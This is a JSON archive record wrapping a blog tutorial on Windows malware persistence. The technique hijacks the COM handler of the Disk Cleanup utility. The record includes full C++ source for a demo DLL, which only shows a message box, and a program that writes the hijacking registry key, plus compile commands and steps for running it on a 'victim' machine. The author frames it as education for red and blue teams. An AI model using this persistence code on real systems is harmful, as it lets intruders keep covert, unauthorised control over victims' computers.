@@ -1,0 +1,42 @@
+{
+    "id": "de91780a-6cc4-49dc-8bc7-c5241e27ffe0",
+    "created_at": "2023-01-12T15:00:43.335521Z",
+    "updated_at": "2025-03-27T02:05:39.532763Z",
+    "deleted_at": null,
+    "sha1_hash": "2d916d76574f856ada302627ee5c823faa1d36e2",
+    "title": "2022-11-16 - Malware development- persistence - part 19. Disk Cleanup Utility. Simple Cplusplus example.",
+    "authors": "",
+    "file_creation_date": "2022-11-28T19:07:38Z",
+    "file_modification_date": "2022-11-28T19:07:38Z",
+    "file_size": 1352420,
+    "plain_text": "# Malware development: persistence - part 19. Disk Cleanup Utility. Simple C++ example.\n\n**[cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html](https://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html)**\n\nNovember 16, 2022\n\n2 minute read\n\n﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\nThis post is based on my own research into one of the more interesting malware persistence\ntricks: via Disk Cleanup Utility.\n\n## disk cleanup\n\nIf you have ever had an issue with limited hard disk space, you are certainly familiar with the\nDisk Cleanup utility:\n\n\n-----\n\nGood news for red teamers, the “Files to delete” list displayed in the user interface is not\nrandom. Just run command:\n```\nreg query\n\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\"\n/s\n\n```\n\n-----\n\n-----\n\nAs you can see, there are even default values ​​of registry keys here.\n\nAlso, if we have\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\default=\n\n```\n```\n<CLSID>, we can find another registry key value: HKCR\\CLSID\\<CLSID>\\InProcServer32\n= <DLLPATH> :\n\n```\n\n-----\n\nFor demo purposes, here I show the example of the registry from\nHKEY_CLASSES_ROOT because HKEY_CURRENT_USER is empty\n\nThis suggests, that we can use [COM DLL hijacking for persistence. Let’s try.](https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html)\n\n## practical example\n\nFirst of all, as usually, create “evil” DLL ( hack.cpp ):\n\n\n-----\n\n```\n/\nhack.cpp\n\nsimple DLL\n\nauthor: @cocomelonc\n\nhttps://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html\n\n*/\n\n#include <windows.h>\n\n#pragma comment (lib, \"user32.lib\")\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {\n\n switch (nReason) {\n\n case DLL_PROCESS_ATTACH:\n\n  MessageBox(\n\n   NULL,\n\n   \"Meow-meow!\",\n\n   \"=^..^=\",\n\n   MB_OK\n\n  );\n\n  break;\n\n case DLL_PROCESS_DETACH:\n\n  break;\n\n case DLL_THREAD_ATTACH:\n\n  break;\n\n case DLL_THREAD_DETACH:\n\n  break;\n\n }\n\n return TRUE;\n\n}\n\n```\nAs usually, for simplicity, it’s just `meow-meow messagbox.`\n\nAnd then create persistence script ( pers.cpp ):\n\n\n-----\n\n```\n/\npers.cpp\n\nwindows persistence via Disk Cleaner\n\nauthor: @cocomelonc\n\nhttps://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html\n\n*/\n#include <windows.h>\n\n#include <string.h>\n\n#include <cstdio>\n\nint main(int argc, char* argv[]) {\n\n HKEY hkey = NULL;\n\n // subkey\n\n const char* sk = \"Software\\\\Classes\\\\CLSID\\\\{8369AB20-56C9-11D0-94E800AA0059CE02}\\\\InprocServer32\";\n\n // malicious DLL\n\n const char* dll = \"Z:\\\\2022-11-16-malware-pers-19\\\\hack.dll\";\n\n // startup\n\n LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL,\nREG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);\n\n if (res == ERROR_SUCCESS) {\n\n  // create new registry keys\n\n  RegSetValueEx(hkey, NULL, 0, REG_SZ, (unsigned char*)dll, strlen(dll));\n\n  RegCloseKey(hkey);\n\n } else {\n\n  printf(\"cannot create subkey value :(\\n\");\n\n  return -1;\n\n }\n\n return 0;\n\n}\n\n```\nAs CLSID I took `8369AB20-56C9-11D0-94E8-00AA0059CE02 . As you can see code is`\n[similar to COM hijacking post. The difference is only in the values of the variables.](https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html)\n\n## demo\n\nLet’s go to compile our evil DLL:\n```\nx86_64-w64-mingw32-gcc -shared -o hack.dll hack.cpp\n\n```\n\n-----\n\nAnd persistence script:\n```\nx86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-allconstants -static-libstdc++ -static-libgcc -fpermissive\n\n\n```\nCopy to victim’s machine. In my case `Windows 10 x64 . Run:`\n```\nreg query \"HKCU\\Software\\Classes\\CLSID\\{8369AB20-56C9-11D0-94E8-00AA0059CE02}\" /s\n\n.\\pers.exe\n\n```\n\n-----\n\n-----\n\nAs you can see, everything is worked perfectly! =^..^=\n\nBut for persistence. requires the user to run Disk Cleanup Utility. Here, I can use one of the\nclassic trick for persistence. Adding Disk Cleanup to run during the start-up may not be the\nbest idea, because it has a GUI. I tried using the command line arguments of this program:\n```\ncleanmgr.exe\n\ncleanmgr.exe /cleanup\n\ncleanmgr.exe /autoclean\n\ncleanmgr.exe /setup\n\n\n```\nBut failed :(. It worked correctly:\n\n\n-----\n\nI think I will return to this issue in one of the future posts.\n\nAlso, according to microsoft documentation, we can add new entries to:\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\n\n```\n\nI don’t know if any APT in the wild used this tactic and trick, but, I hope this post spreads\nawareness to the blue teamers of this interesting technique especially when create software,\nand adds a weapon to the red teamers arsenal.\n\nThis is a practical case for educational purposes only.\n\n[MSDN Registering Disk Cleanup Handler](https://learn.microsoft.com/en-us/windows/win32/lwef/disk-cleanup?redirectedfrom=MSDN#registration)\n[DLL hijacking](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)\n[DLL hijacking with exported functions](https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html)\n[Malware persistence: part 1](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)\n[Malware persistence: part 3](https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html)\n[source code in github](https://github.com/cocomelonc/2022-11-16-malware-pers-19)\n\n\n-----\n\nThanks for your time happy hacking and good bye!\n_PS. All drawings and screenshots are mine_\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-11-16 - Malware development- persistence - part 19. Disk Cleanup Utility. Simple Cplusplus example..pdf"
+    ],
+    "report_names": [
+        "2022-11-16 - Malware development- persistence - part 19. Disk Cleanup Utility. Simple Cplusplus example..pdf"
+    ],
+    "threat_actors": [],
+    "ts_created_at": 1673535643,
+    "ts_updated_at": 1743041139,
+    "ts_creation_date": 1669662458,
+    "ts_modification_date": 1669662458,
+    "files": {
+        "pdf": "https://archive.orkl.eu/2d916d76574f856ada302627ee5c823faa1d36e2.pdf",
+        "text": "https://archive.orkl.eu/2d916d76574f856ada302627ee5c823faa1d36e2.txt",
+        "img": "https://archive.orkl.eu/2d916d76574f856ada302627ee5c823faa1d36e2.jpg"
+    }
+}
